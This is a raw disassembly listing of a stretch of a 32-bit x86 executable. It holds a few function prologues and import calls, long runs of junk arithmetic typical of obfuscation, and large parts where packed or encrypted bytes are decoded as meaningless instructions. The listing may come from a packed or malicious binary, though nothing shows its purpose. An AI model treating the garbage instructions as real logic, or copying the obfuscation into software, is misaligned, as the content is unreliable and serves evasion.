  4174b3:	add    DWORD PTR [edi+0x49],ecx
  4174b6:	jp     0x41748c
  4174b8:	xchg   esp,eax
  4174b9:	xchg   edx,eax
  4174ba:	jno    0x417485
  4174bc:	pop    ebx
  4174bd:	and    al,0x5a
  4174bf:	xor    eax,ecx
  4174c1:	sub    edx,eax
  4174c3:	cmp    edi,edx
  4174c5:	jbe    0x4170cf
  4174cb:	pop    edi
  4174cc:	pop    esi
  4174cd:	pop    ebx
  4174ce:	leave  
  4174cf:	ret    0x8
  4174d2:	push   ebp
  4174d3:	mov    ebp,esp
  4174d5:	and    esp,0xfffffff8
  4174d8:	sub    esp,0x9c
  4174de:	push   ebx
  4174df:	push   esi
  4174e0:	push   edi
  4174e1:	push   DWORD PTR ds:0x4223d4
  4174e7:	lea    eax,[esp+0xa4]
  4174ee:	push   eax
  4174ef:	call   DWORD PTR ds:0x428e70
  4174f5:	push   DWORD PTR [esp+0xa4]
  4174fc:	push   DWORD PTR ds:0x4223c0
  417502:	call   DWORD PTR ds:0x428e94
  417508:	push   eax
  417509:	call   DWORD PTR ds:0x428e7c
  41750f:	mov    ecx,DWORD PTR ds:0x422788
  417515:	sub    DWORD PTR ds:0x42830f,0x42838b
  41751f:	jmp    0x4178ee
  417524:	iret   
  417525:	and    ah,BYTE PTR [esi]
  417527:	inc    eax
  417528:	sbb    bh,BYTE PTR [edi+ebp*4]
  41752b:	and    cl,BYTE PTR [ecx+edx*8]
  41752e:	fnstcw WORD PTR [ecx+edx*4+0xaaa55f4]
  417535:	out    0x16,eax
  417537:	sbb    BYTE PTR [edx+edx*1+0x6aa01818],bh
  41753e:	std    
  41753f:	daa    
  417540:	shl    BYTE PTR ds:0xd287f18d,1
  417546:	cmc    
  417547:	inc    esp
  417548:	sbb    eax,0x2ddfae73
  41754d:	mov    ah,BYTE PTR [eax-0x77fa2042]
  417553:	(bad)  
  417554:	sub    DWORD PTR [edi+0x48852075],esp
  41755a:	call   0x1b05:0xcf35f652
  417561:	mov    dh,0x61
  417563:	pop    es
  417564:	cmp    eax,0x3617bfd9
  417569:	ds adc eax,0xda3db403
  41756f:	rcpps  xmm7,XMMWORD PTR [ebx]
  417572:	inc    esi
  417573:	sahf   
  417574:	aam    0xd1
  417576:	push   ebp
  417577:	dec    eax
  417578:	daa    
  417579:	sub    eax,0xef6725b2
  41757e:	jns    0x41754b
  417580:	sub    DWORD PTR [eax+0x31648f99],esp
  417586:	xchg   ecx,eax
  417587:	int3   
  417588:	icebp  
  417589:	jge    0x417526
  41758b:	pop    esp
  41758c:	push   0x68dc6f43
  417591:	push   esp
  417592:	xchg   ebx,eax
  417593:	cmc    
  417594:	pusha  
  417595:	jne    0x41753e
  417597:	mov    eax,0x80581a3
  41759c:	popa   
  41759d:	inc    edx
  41759e:	pop    ecx
  41759f:	and    ch,ah
  4175a1:	fst    QWORD PTR [ebx-0x5a5cddb9]
  4175a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4175a8:	sahf   
  4175a9:	fisubr WORD PTR [edx]
  4175ab:	int    0xdb
  4175ad:	and    DWORD PTR [esi-0x4a4a897b],esp
  4175b3:	sbb    ah,0xbd
  4175b6:	outs   dx,DWORD PTR ds:[esi]
  4175b7:	retf   0x7487
  4175ba:	dec    DWORD PTR [edi+0x63]
  4175bd:	in     al,dx
  4175be:	inc    ebp
  4175bf:	push   edx
  4175c0:	push   0x52dba89
  4175c5:	icebp  
  4175c6:	mov    dl,0x6e
  4175c8:	dec    edx
  4175c9:	inc    esp
  4175ca:	out    dx,eax
  4175cb:	lods   eax,DWORD PTR ds:[esi]
  4175cc:	fsub   QWORD PTR [ecx+0x7b]
  4175cf:	leave  
  4175d0:	or     DWORD PTR [bp-0x746a],0x3ca7245e
  4175d9:	cmp    DWORD PTR [ebp+0x2098ae82],esi
  4175df:	jno    0x4175be
  4175e1:	xor    ah,BYTE PTR [edi]
  4175e3:	push   esp
  4175e4:	retf   
  4175e5:	xchg   ebp,eax
  4175e6:	add    esi,esi
  4175e8:	loop   0x417626
  4175ea:	call   0x716e1294
  4175ef:	jno    0x417580
  4175f1:	pop    es
  4175f2:	mov    bh,0xc0
  4175f4:	mov    cl,0x91
  4175f6:	jmp    0x68ba:0x51559d26
  4175fd:	(bad)  
  4175fe:	repz cmp ah,BYTE PTR [ecx+0x116053a0]
  417605:	jbe    0x41760f
  417607:	cmp    ah,BYTE PTR [ebx-0x57335f47]
  41760d:	mov    edi,0xb8a38e28
  417612:	std    
  417613:	dec    edx
  417614:	sub    al,0x8b
  417616:	ins    DWORD PTR es:[edi],dx
  417617:	jno    0x417647
  417619:	shl    DWORD PTR [ebp+0x73],1
  41761c:	cmp    esp,DWORD PTR [edi+0x40d58328]
  417622:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417623:	sub    BYTE PTR [ecx-0x34],0xfd
  417627:	inc    eax
  417628:	sub    ecx,DWORD PTR ds:0xb77b768a
  41762e:	push   ecx
  41762f:	xor    eax,0xb75e4653
  417634:	add    al,0x49
  417636:	inc    esi
  417637:	and    dl,BYTE PTR [esi]
  417639:	pop    eax
  41763a:	fstp   DWORD PTR [ebx]
  41763c:	xor    eax,0x6787b8da
  417641:	xchg   edx,eax
  417642:	jno    0x4175e6
  417644:	cmp    BYTE PTR [edx-0x34],0x9
  417648:	sub    al,0x3e
  41764a:	aaa    
  41764b:	adc    bl,dl
  41764d:	imul   esp,DWORD PTR fs:[esi-0x591002b0],0xb8d8f68
  417658:	cmp    edx,DWORD PTR [ebx-0x37]
  41765b:	lods   eax,DWORD PTR ds:[esi]
  41765c:	iret   
  41765d:	and    DWORD PTR [ecx+0x41352a31],edx
  417663:	fld    TBYTE PTR [esi-0x4d375fc4]
  417669:	and    eax,0x86715c5f
  41766e:	pop    eax
  41766f:	sbb    BYTE PTR [ecx-0x5ea65b2],dh
  417675:	lods   al,BYTE PTR ds:[esi]
  417676:	lea    edi,[edi+0x6b]
  417679:	xor    bh,BYTE PTR [ebx+0x6]
  41767c:	jg     0x417698
  41767e:	inc    edi
  41767f:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  417681:	add    edi,DWORD PTR [ecx]
  417683:	mov    al,ds:0xa4f16cc
  417688:	pop    ebp
  417689:	sub    DWORD PTR ds:0x622d00a4,esi
  41768f:	enter  0xf7f4,0x56
  417693:	or     eax,0x2bfeb737
  417698:	cmp    DWORD PTR [eax-0xaaa54ca],edi
  41769e:	mov    dl,0xc1
  4176a0:	jp     0x4176e0
  4176a2:	push   0xffffff81
  4176a4:	mov    ebx,0x7f28ef90
  4176a9:	jecxz  0x41764d
  4176ab:	mov    ds:0x3e8be5c1,eax
  4176b0:	inc    esp
  4176b1:	jmp    0x96fe71a9
  4176b6:	push   edi
  4176b7:	push   esi
  4176b8:	adc    cl,BYTE PTR [edx+0x43c894e6]
  4176be:	push   ebx
  4176bf:	jmp    0x9482:0x692a11ba
  4176c6:	jg     0x41771b
  4176c8:	mov    ebp,0x331267fb
  4176cd:	fimul  WORD PTR [edx]
  4176cf:	xlat   BYTE PTR ds:[ebx]
  4176d0:	repz popf 
  4176d2:	out    dx,eax
  4176d3:	cmc    
  4176d4:	or     BYTE PTR [ebp+0x73],0x40
  4176d8:	pop    ebx
  4176d9:	sub    DWORD PTR [ebp-0x23],ebp
  4176dc:	dec    ebp
  4176dd:	js     0x4176f8
  4176df:	jns    0x417754
  4176e1:	jle    0x417700
  4176e3:	jae    0x417685
  4176e5:	adc    DWORD PTR [ebp+edx*4+0x6e],ecx
  4176e9:	rol    BYTE PTR [ecx+0x1795fdbc],cl
  4176ef:	mov    al,0xdb
  4176f1:	into   
  4176f2:	cli    
  4176f3:	inc    edx
  4176f4:	lock test eax,0x17c468bf
  4176fa:	cmp    ah,BYTE PTR [ebx-0x28d34de1]
  417700:	imul   ebx,DWORD PTR [edi-0x568eb0b7],0xffffff83
  417707:	add    BYTE PTR [ecx+0x38],0x51
  41770b:	inc    esi
  41770c:	sar    BYTE PTR [edx],1
  41770e:	xor    eax,0xd82ba2a8
  417713:	popa   
  417714:	mov    al,0x1c
  417716:	ret    
  417717:	mov    ecx,DWORD PTR [ebp-0x9]
  41771a:	daa    
  41771b:	add    bl,bh
  41771d:	(bad)  
  41771e:	daa    
  41771f:	dec    edi
  417720:	(bad)  
  417721:	pusha  
  417722:	mov    ds:0x5b747a11,al
  417727:	adc    al,0xa8
  417729:	or     eax,0x18d29805
  41772e:	in     al,0x11
  417730:	fiadd  DWORD PTR [ecx-0x1c7e5366]
  417736:	xor    esi,edx
  417738:	aam    0xdf
  41773a:	sbb    DWORD PTR [ecx+0x38],esp
  41773d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41773e:	inc    esp
  41773f:	mov    al,ds:0xf0dd250f
  417744:	sbb    BYTE PTR [eax+0x46],ah
  417747:	fisubr WORD PTR [esi+edi*1+0x4e82505f]
  41774e:	dec    esi
  41774f:	fcom   DWORD PTR [eax-0x4c]
  417752:	dec    esi
  417753:	push   ebx
  417754:	jns    0x4176f9
  417756:	sbb    BYTE PTR [ebx-0x5c205bd7],0x69
  41775d:	or     eax,0x6a264b7a
  417762:	inc    ecx
  417763:	cmp    ecx,DWORD PTR [esi+ebx*2+0x45b9031a]
  41776a:	jge    0x417701
  41776c:	cwde   
  41776d:	scas   al,BYTE PTR es:[edi]
  41776e:	sbb    DWORD PTR [esp+eiz*8-0x55339802],edi
  417775:	aam    0xaa
  417777:	xor    ecx,ebx
  417779:	jmp    0x1d8d4ee8
  41777e:	out    0x39,al
  417780:	cmp    al,0xce
  417782:	sub    eax,0x97eb7805
  417787:	je     0x417718
  417789:	fcom   QWORD PTR [edx-0x9]
  41778c:	(bad)  
  417790:	mov    dh,BYTE PTR [ebx+ebp*4+0x73]
  417794:	push   edx
  417795:	icebp  
  417796:	out    dx,eax
  417797:	sub    DWORD PTR [ecx],ecx
  417799:	pop    edx
  41779a:	call   FWORD PTR [edx-0x2c8f9aea]
  4177a0:	adc    esp,esi
  4177a2:	pop    ds
  4177a3:	and    DWORD PTR [esi-0x66],esi
  4177a6:	or     ecx,ecx
  4177a8:	ret    
  4177a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4177aa:	test   al,0xac
  4177ac:	call   0xb609:0xc24ec223
  4177b3:	ins    DWORD PTR es:[edi],dx
  4177b4:	ds cwde 
  4177b6:	jecxz  0x41776c
  4177b8:	ror    BYTE PTR [edx-0x73],0xd
  4177bc:	hlt    
  4177bd:	xor    DWORD PTR [ebx+0x77],ebp
  4177c0:	ds retf 0xc160
  4177c4:	mov    al,ds:0x6efc758b
  4177c9:	jb     0x417794
  4177cb:	das    
  4177cc:	sub    eax,esp
  4177ce:	xchg   ecx,eax
  4177cf:	popf   
  4177d0:	in     al,0x69
  4177d2:	xor    al,0x6b
  4177d4:	push   esi
  4177d5:	pop    eax
  4177d6:	push   ebx
  4177d7:	adc    BYTE PTR [ecx+0x37a0d73a],0xcd
  4177de:	les    ebp,FWORD PTR [edi-0x12]
  4177e1:	add    BYTE PTR [ebx+edx*8-0x2b],ch
  4177e5:	data16 jbe 0x4177da
  4177e8:	xchg   ebx,eax
  4177e9:	mov    edi,0xba64f1b3
  4177ee:	inc    ecx
  4177ef:	mov    dh,BYTE PTR [eax+ebx*2-0x34]
  4177f3:	popa   
  4177f4:	push   0x6e
  4177f6:	mov    dl,0xf4
  4177f8:	inc    eax
  4177f9:	loope  0x41786a
  4177fb:	test   BYTE PTR [edi+0x31],dh
  4177fe:	std    
  4177ff:	stos   DWORD PTR es:[edi],eax
  417800:	inc    ebp
  417801:	and    al,0xc8
  417803:	cli    
  417804:	adc    al,0xa6
  417806:	rol    DWORD PTR [ebx-0x5650436d],1
  41780c:	imul   esp,DWORD PTR [edx+0x6615ad13],0xe69197b3
  417816:	jge    0x417855
  417818:	in     eax,dx
  417819:	enter  0x2871,0xc0
  41781d:	call   0x50b0:0x360b7f81
  417824:	rcr    bl,1
  417826:	scas   eax,DWORD PTR es:[edi]
  417827:	sti    
  417828:	in     al,dx
  417829:	and    DWORD PTR [edx+0x76e83f0],ebp
  41782f:	mul    BYTE PTR [eax]
  417831:	mov    esi,0xc20803ba
  417836:	pop    ecx
  417837:	das    
  417838:	cmc    
  417839:	icebp  
  41783a:	pop    es
  41783b:	jmp    0x9026:0x9ca2de67
  417842:	jno    0x4177ff
  417844:	adc    eax,0xd094c1c1
  417849:	xchg   BYTE PTR [edi],al
  41784b:	sbb    BYTE PTR [eax+0x22],cl
  41784e:	xchg   ecx,eax
  41784f:	pop    ds
  417850:	xor    DWORD PTR [esi],edi
  417852:	cmp    BYTE PTR [ebp+edi*1-0x94769d6],dh
  417859:	adc    ch,bl
  41785b:	sbb    ecx,DWORD PTR [edi-0x45eda0b8]
  417861:	xor    edi,edx
  417863:	push   ds
  417864:	jmp    0x917bb587
  417869:	jge    0x4178d6
  41786b:	cmp    eax,0x5daa70ea
  417870:	in     al,dx
  417871:	xor    dl,cl
  417873:	dec    esp
  417874:	(bad)  
  417875:	and    DWORD PTR [esi-0x10],ebx
  417878:	ds add dl,bl
  41787b:	cmp    ecx,ebp
  41787d:	fucomp st(5)
  41787f:	mov    ebp,0xd69a773f
  417884:	js     0x417850
  417886:	pusha  
  417887:	or     al,0xd8
  417889:	adc    dh,ah
  41788b:	lods   eax,DWORD PTR ds:[esi]
  41788c:	mov    dl,BYTE PTR [ecx-0x3a56ca94]
  417892:	std    
  417893:	mov    DWORD PTR [eax],edx
  417895:	push   eax
  417896:	int    0x60
  417898:	pushf  
  417899:	ds inc esp
  41789b:	jb     0x417838
  41789d:	push   edi
  41789e:	inc    edx
  41789f:	push   esi
  4178a0:	retf   
  4178a1:	push   ds
  4178a2:	into   
  4178a3:	cmp    esi,DWORD PTR [ebx-0x51]
  4178a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178a7:	pusha  
  4178a8:	xor    DWORD PTR [ecx+0x682f8a6],ebx
  4178ae:	lds    eax,FWORD PTR [edx+0x2f]
  4178b1:	inc    ecx
  4178b2:	add    ebx,0x97b592f
  4178b8:	aaa    
  4178b9:	ficom  WORD PTR [eax]
  4178bb:	sbb    bl,BYTE PTR [ebx-0x4a]
  4178be:	lea    ecx,[ebx+0x36]
  4178c1:	push   0xb8036662
  4178c6:	loope  0x417924
  4178c8:	cmp    BYTE PTR [esi],ah
  4178ca:	iret   
  4178cb:	add    eax,0xe811c394
  4178d0:	jecxz  0x4178ad
  4178d2:	in     al,0x38
  4178d4:	xchg   ebp,eax
  4178d5:	dec    edi
  4178d6:	je     0x417860
  4178d8:	xchg   esi,eax
  4178d9:	mov    eax,ds:0x9ff2dbdc
  4178de:	inc    edx
  4178df:	jp     0x417927
  4178e1:	mov    ds:0x8554ad20,al
  4178e6:	push   edi
  4178e7:	jae    0x4178ab
  4178e9:	push   ecx
  4178ea:	addr16 or ah,ch
  4178ed:	and    eax,0x2581006a
  4178f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4178f3:	add    BYTE PTR [edx+0x0],0xb6
  4178f7:	outs   dx,DWORD PTR ds:[esi]
  4178f8:	add    BYTE PTR [eax],al
  4178fa:	push   DWORD PTR [ecx]
  4178fc:	or     DWORD PTR ds:0x428247,0x652f
  417906:	call   eax
  417908:	adc    esi,DWORD PTR ds:0x42825f
  41790e:	mov    esi,0x1ff
  417913:	add    eax,eax
  417915:	mov    DWORD PTR [esp+0x24],0x3992
  41791d:	mov    DWORD PTR [esp+0xc],0x79a2
  417925:	add    DWORD PTR ds:0x428247,0x3f4a
  41792f:	mov    eax,DWORD PTR [esp+0xc]
  417933:	mov    ecx,DWORD PTR ds:0x4282e7
  417939:	mov    ecx,DWORD PTR [ecx]
  41793b:	and    DWORD PTR ds:0x4282af,ecx
  417941:	mov    ecx,DWORD PTR [esp+0x24]
  417945:	sub    DWORD PTR ds:0x42825f,0x428267
  41794f:	xor    eax,0x1d22
  417954:	xor    DWORD PTR ds:0x428323,0x3de5
  41795e:	imul   eax,eax,0xffffdeb4
  417964:	and    eax,0x43eb
  417969:	sub    eax,ecx
  41796b:	xor    DWORD PTR ds:0x42827f,0x4281ab
  417975:	mov    DWORD PTR [esp+0x3c],eax
  417979:	xor    DWORD PTR ds:0x42816b,0x24fe
  417983:	mov    DWORD PTR [esp+0x38],0x3b18
  41798b:	mov    DWORD PTR [esp+0x2c],0x6c93
  417993:	adc    DWORD PTR ds:0x42826f,0x3367
  41799d:	mov    DWORD PTR [esp+0x24],0x418e
  4179a5:	add    DWORD PTR ds:0x4282ab,ebx
  4179ab:	mov    DWORD PTR [esp+0xc],0x5ac3
  4179b3:	xor    ecx,ecx
  4179b5:	add    ecx,DWORD PTR ds:0x4283b7
  4179bb:	add    DWORD PTR ds:0x42817b,ecx
  4179c1:	mov    eax,DWORD PTR [esp+0xc]
  4179c5:	mov    ecx,DWORD PTR [esp+0x24]
  4179c9:	add    DWORD PTR ds:0x4282a3,0x705
  4179d3:	sub    ecx,eax
  4179d5:	and    eax,0x1ffb
  4179da:	mov    eax,DWORD PTR [esp+0x2c]
  4179de:	and    ecx,eax
  4179e0:	mov    eax,DWORD PTR [esp+0x38]
  4179e4:	sbb    DWORD PTR ds:0x428163,0x42837f
  4179ee:	xor    ecx,0x10d6
  4179f4:	sub    ecx,0x782c
  4179fa:	imul   ecx,eax
  4179fd:	mov    eax,0x7fd0
  417a02:	mov    eax,DWORD PTR [esp+0x3c]
  417a06:	cmp    eax,ecx
  417a08:	mov    DWORD PTR ds:0x42817b,0x7353
  417a12:	jne    0x41890f
  417a18:	and    eax,eax
  417a1a:	mov    DWORD PTR [esp+0x10],0x1
  417a22:	mov    DWORD PTR [esp+0x30],0x2f16
  417a2a:	xor    ecx,DWORD PTR ds:0x428267
  417a30:	mov    DWORD PTR [esp+0x48],0x16f
  417a38:	mov    DWORD PTR [esp+0x50],0x30c5
  417a40:	add    DWORD PTR ds:0x428307,edx
  417a46:	push   DWORD PTR ds:0xe5bfd6f1
  417a4c:	cmp    DWORD PTR ds:0x428283,0x0
  417a53:	mov    DWORD PTR ds:0x4282ff,edx
  417a59:	mov    ecx,0x328
  417a5e:	mov    ecx,0x6d04
  417a63:	jmp    0x417abd
  417a68:	mov    DWORD PTR ds:0x428277,0x44f5
  417a72:	cmp    DWORD PTR ds:0x428283,0x0
  417a79:	je     0x417a9d
  417a7f:	push   DWORD PTR [ebp-0x18]
  417a82:	push   DWORD PTR [ebp-0x18]
  417a85:	push   0x8f00
  417a8a:	push   DWORD PTR [ebp-0x10]
  417a8d:	call   DWORD PTR ds:0x428df4
  417a93:	not    ecx
  417a95:	sub    ecx,ecx
  417a97:	or     DWORD PTR ds:0x428257,ebx
  417a9d:	mov    ecx,DWORD PTR ds:0x4282e3
  417aa3:	mov    ecx,DWORD PTR [ecx]
  417aa5:	and    DWORD PTR ds:0x42819b,ecx
  417aab:	sbb    ecx,0x5390
  417ab1:	add    ecx,0xb3f
  417ab7:	add    DWORD PTR ds:0x4281ab,edi
  417abd:	mov    DWORD PTR [esp+0x8c],0x4ebc
  417ac8:	xor    eax,eax
  417aca:	mov    DWORD PTR [esp+0x98],0x76
  417ad5:	mov    DWORD PTR [esp+0x40],0x556d
  417add:	neg    DWORD PTR ds:0x42816f
  417ae3:	jmp    0x417eb2
  417ae8:	(bad)  [eax-0x2]
  417aec:	xor    BYTE PTR [edx+0x1a],bh
  417aef:	fwait
  417af0:	clc    
  417af1:	dec    edi
  417af2:	arpl   WORD PTR [esp+eax*1-0x5181e055],di
  417af9:	loope  0x417b11
  417afb:	sbb    BYTE PTR [edx+edx*1-0x6af0e7e8],bh
  417b02:	xor    al,0xf7
  417b04:	mov    dl,0x8a
  417b06:	jmp    0xad20:0x4f58ca45
  417b0d:	mov    edi,0x7b6b06b9
  417b12:	jbe    0x417b06
  417b14:	add    DWORD PTR [ecx+0x50],esp
  417b17:	pop    esp
  417b18:	iret   
  417b19:	sub    al,0x92
  417b1b:	pop    ecx
  417b1c:	iret   
  417b1d:	cld    
  417b1e:	xor    BYTE PTR [ecx],dh
  417b20:	(bad)  
  417b21:	jo     0x417b50
  417b23:	pusha  
  417b24:	imul   ecx,esi,0xffffff99
  417b27:	(bad)  
  417b28:	call   0x87a:0x2f6f0a
  417b2f:	mov    ds:0x7782337d,eax
  417b34:	mov    al,ds:0x64baaaab
  417b39:	fadd   QWORD PTR [edi+edi*1-0x71]
  417b3d:	and    bl,BYTE PTR [edi]
  417b3f:	jo     0x417b80
  417b41:	mov    ebp,0x6b29c0cf
  417b46:	push   eax
  417b47:	test   al,0x52
  417b49:	pop    eax
  417b4a:	sbb    bl,cl
  417b4c:	call   0xb8955dcd
  417b51:	pop    es
  417b52:	jne    0x417b78
  417b54:	in     eax,dx
  417b55:	adc    edx,ebp
  417b57:	sahf   
  417b58:	test   BYTE PTR [ecx-0x3f3deeba],ah
  417b5e:	and    ebx,DWORD PTR [ebx-0x47]
  417b61:	fdivr  DWORD PTR [ecx]
  417b63:	mov    ds:0x693c168,al
  417b68:	dec    ebp
  417b69:	or     cl,BYTE PTR [ecx-0x4c]
  417b6c:	shr    BYTE PTR [ebp-0x3db64a21],0x42
  417b73:	push   ebx
  417b74:	arpl   WORD PTR [ecx+0x5f],dx
  417b77:	cld    
  417b78:	cmc    
  417b79:	dec    BYTE PTR [edi-0xf4b0167]
  417b7f:	or     DWORD PTR [esi-0xd682c33],eax
  417b85:	mov    esi,0x8f5ce4d3
  417b8a:	ds je  0x417bf5
  417b8d:	cmc    
  417b8e:	sub    eax,DWORD PTR [edx+eax*1]
  417b91:	push   ecx
  417b92:	cmp    ebx,edx
  417b94:	inc    esi
  417b95:	pop    es
  417b96:	aam    0xd5
  417b98:	out    dx,eax
  417b99:	cwde   
  417b9a:	(bad)  
  417b9b:	fidivr WORD PTR [ebx-0x7d2f808d]
  417ba1:	dec    edi
  417ba2:	das    
  417ba3:	shl    BYTE PTR [ebx+0x3f51e24c],1
  417ba9:	mov    ah,0x22
  417bab:	mov    ds:0xed00e82d,eax
  417bb0:	jne    0x417bf8
  417bb2:	ret    0x256f
  417bb5:	repz adc eax,0xb1fd8229
  417bbb:	fidiv  WORD PTR [ecx+0x72]
  417bbe:	jp     0x417bde
  417bc0:	loopne 0x417b4c
  417bc2:	dec    eax
  417bc3:	mov    bl,0x47
  417bc5:	cmp    dh,BYTE PTR [ecx+edi*1-0x703d9ecc]
  417bcc:	lds    edx,FWORD PTR [ebx+0x3b]
  417bcf:	jl     0x417bb3
  417bd1:	test   al,0xc3
  417bd3:	gs jp  0x417c3a
  417bd6:	aas    
  417bd7:	xor    edx,esp
  417bd9:	in     al,0x4b
  417bdb:	or     bl,BYTE PTR [edx-0x18]
  417bde:	test   DWORD PTR [esi-0x696c417b],0x48592103
  417be8:	xor    BYTE PTR [ecx+0x51],dl
  417beb:	xchg   edi,eax
  417bec:	sub    eax,0xecbf91dc
  417bf1:	loopne 0x417bca
  417bf3:	jns    0x417b93
  417bf5:	dec    eax
  417bf6:	push   esp
  417bf7:	fiadd  DWORD PTR [ebx+0x6a]
  417bfa:	or     esp,DWORD PTR [edi+0x31]
  417bfd:	loope  0x417bd6
  417bff:	mov    ebp,0xf199f4ce
  417c04:	add    DWORD PTR ds:0xc119ed72,esi
  417c0a:	mov    eax,0x79e25951
  417c0f:	xor    BYTE PTR [edx],al
  417c11:	div    ah
  417c13:	add    BYTE PTR cs:[esi+0x16],cl
  417c17:	mov    bh,0xc5
  417c19:	mov    cl,BYTE PTR [ecx+edx*4]
  417c1c:	mov    edi,0xf32a7148
  417c21:	cmp    BYTE PTR [esi+0x2],bl
  417c24:	add    esi,DWORD PTR [bx+si-0x3f8f]
  417c29:	inc    edi
  417c2a:	pop    es
  417c2b:	xchg   ecx,eax
  417c2c:	sub    edx,esi
  417c2e:	sbb    eax,0xee6ab4c
  417c33:	mov    esp,0x2901fbe3
  417c38:	call   0x9222:0xaa5f5eb3
  417c3f:	or     eax,DWORD PTR [edx+0x5526cddd]
  417c45:	int3   
  417c46:	sar    DWORD PTR ss:[ecx-0x5b],cl
  417c4a:	aas    
  417c4b:	test   eax,0x5fc159d8
  417c50:	add    al,0x67
  417c52:	mov    dh,0x25
  417c54:	or     DWORD PTR [ebx+0x3296916],eax
  417c5a:	mov    dh,0xfd
  417c5c:	(bad)  
  417c5d:	lahf   
  417c5e:	add    eax,0xa0c254ed
  417c63:	mov    bl,0x7d
  417c65:	and    BYTE PTR ds:0x71ca36a2,bl
  417c6b:	fadd   DWORD PTR [ecx-0x12]
  417c6e:	or     DWORD PTR [edx+0x26],0x1b
  417c72:	test   al,0x1
  417c74:	icebp  
  417c75:	push   esp
  417c76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417c77:	jnp    0x417c3f
  417c79:	pop    ecx
  417c7a:	mov    ds:0x3e3d7068,al
  417c7f:	and    ebp,edi
  417c81:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417c82:	dec    edx
  417c83:	adc    ch,BYTE PTR [ecx*1-0x939993a]
  417c8a:	nop
  417c8b:	icebp  
  417c8c:	lea    edi,[ebx]
  417c8e:	div    ah
  417c90:	and    eax,eax
  417c92:	rol    BYTE PTR [edi-0x80],0xf4
  417c96:	adc    ah,BYTE PTR [eax-0x8]
  417c99:	ret    
  417c9a:	or     DWORD PTR [edi],ebx
  417c9c:	ficom  WORD PTR [edi-0x7d]
  417c9f:	repz mov al,fs:0x23b86476
  417ca6:	xchg   ebx,eax
  417ca7:	(bad)  
  417ca8:	rol    BYTE PTR [edi-0x28],cl
  417cab:	xchg   edx,eax
  417cac:	pop    ecx
  417cad:	ret    
  417cae:	jnp    0x417c86
  417cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417cb1:	add    BYTE PTR [ebp+0x580e7f54],ah
  417cb7:	pop    es
  417cb8:	xchg   BYTE PTR [esi],ch
  417cba:	nop
  417cbb:	jmp    0x417d04
  417cbd:	sbb    DWORD PTR [esi],esp
  417cbf:	pop    ds
  417cc0:	jne    0x417c6f
  417cc2:	push   esp
  417cc4:	loopne 0x417d2c
  417cc6:	imul   eax,DWORD PTR [ebp+0x5],0x9577086a
  417ccd:	rcl    BYTE PTR [ecx],0xdb
  417cd0:	mov    cl,0x59
  417cd2:	pop    es
  417cd3:	mov    eax,ds:0xb396cc1a
  417cd8:	fisttp DWORD PTR [ebx-0x4f9d9143]
  417cde:	mov    ecx,0x3f3ceb82
  417ce3:	xchg   esp,eax
  417ce4:	ins    BYTE PTR es:[edi],dx
  417ce5:	and    eax,esp
  417ce7:	sub    bl,BYTE PTR [ecx]
  417ce9:	pop    esp
  417cea:	sbb    DWORD PTR [ebx],0x7
  417ced:	and    DWORD PTR [edi-0x75],0xffffffe7
  417cf1:	fwait
  417cf2:	lds    eax,FWORD PTR [ebx]
  417cf4:	fs loope 0x417cd1
  417cf7:	sbb    ecx,DWORD PTR [edx-0x195a6bf0]
  417cfd:	imul   eax,eax,0x79
  417d00:	out    0x8b,al
  417d02:	cld    
  417d03:	or     bh,BYTE PTR ds:0xf037d756
  417d09:	xor    edx,DWORD PTR [edi+edi*2-0x4cd4cf99]
  417d10:	fcomi  st,st(6)
  417d12:	aas    
  417d13:	or     BYTE PTR cs:[ecx-0x7229d49d],0xe
  417d1b:	pop    eax
  417d1c:	ins    BYTE PTR es:[edi],dx
  417d1d:	mov    ebx,0x54da598f
  417d22:	pusha  
  417d23:	fadd   st(0),st
  417d25:	pop    ebp
  417d26:	(bad)  
  417d27:	sbb    al,bl
  417d29:	adc    al,0xe7
  417d2b:	dec    edi
  417d2c:	cli    
  417d2d:	mov    dl,0x44
  417d2f:	out    dx,eax
  417d30:	not    edx
  417d32:	popf   
  417d33:	rcr    BYTE PTR [ecx-0x72a15cd9],1
  417d39:	mov    al,0xc4
  417d3b:	imul   edi,DWORD PTR [ebp+0x1],0x41293f3c
  417d42:	daa    
  417d43:	dec    ecx
  417d44:	mov    ebx,0xcd12a10e
  417d49:	and    bh,bh
  417d4b:	inc    edx
  417d4c:	je     0x417d65
  417d4e:	cmp    bh,0x98
  417d51:	int    0xd0
  417d53:	mov    edx,0x136c43ab
  417d58:	imul   eax,esi,0x58e50d29
  417d5e:	jmp    0x417d20
  417d60:	mov    ch,0x72
  417d62:	mov    dh,BYTE PTR [edi+0x33dfe72b]
  417d68:	xor    BYTE PTR [ebx],al
  417d6a:	pop    ebx
  417d6b:	gs add dh,cl
  417d6e:	shl    ebp,0x89
  417d71:	test   al,0x8b
  417d73:	adc    ecx,DWORD PTR [ecx]
  417d75:	mov    es,WORD PTR [ecx-0xe89e0cc]
  417d7b:	xor    eax,0xd62aca92
  417d80:	mov    eax,ds:0xa8e0540a
  417d85:	jb     0x417d85
  417d87:	call   0xab39:0x9a253bd7
  417d8e:	inc    BYTE PTR [ebx]
  417d90:	aam    0x59
  417d92:	push   ebp
  417d93:	jb     0x417d27
  417d95:	lahf   
  417d96:	shl    DWORD PTR [ecx-0x710b60b4],1
  417d9c:	sub    edi,DWORD PTR [ecx]
  417d9e:	jmp    0x12aa81f8
  417da3:	pop    esp
  417da4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417da5:	(bad)  [edi+0x579429e4]
  417dab:	(bad)  
  417dac:	push   ebp
  417dad:	pop    edi
  417dae:	popa   
  417daf:	pop    ebp
  417db0:	push   eax
  417db1:	push   edx
  417db2:	pop    esi
  417db3:	push   ss
  417db4:	cwde   
  417db5:	sub    al,0xe
  417db7:	jne    0x417e08
  417db9:	push   edx
  417dba:	mov    edx,0xbfef5b47
  417dbf:	int3   
  417dc0:	jecxz  0x417d97
